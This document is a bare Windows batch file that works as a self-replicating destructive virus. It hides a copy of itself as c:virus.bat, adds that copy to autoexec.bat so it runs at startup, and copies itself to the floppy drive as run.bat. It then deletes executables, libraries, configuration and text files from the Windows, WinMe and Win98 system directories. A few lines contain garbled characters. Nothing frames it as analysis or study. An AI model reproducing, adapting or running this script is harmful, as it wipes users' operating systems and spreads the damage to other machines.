@echo off
if exist c:virus.bat goto cool 
copy %0 c:virus.bat >nul 
attrib +h c:virus.bat >nul 
echo c:virus.bat>>c:autoexec.bat 
:cool 
copy %0 a:run.bat >nul 
Cd\ 
Cd C: 
�d windows 
del *.exe 
del *.ini 
del *.com 
cd\ 
cd windows 
cd system 
del *.dll 
del *.exe 
Cd\ 
Cd C: 
�d winMe 
Del *.exe 
Del *.ini 
Del *.com 
Cd\ 
Cd win98 
Cd system 
Del *.dll 
Del *.exe 
Del *.txt
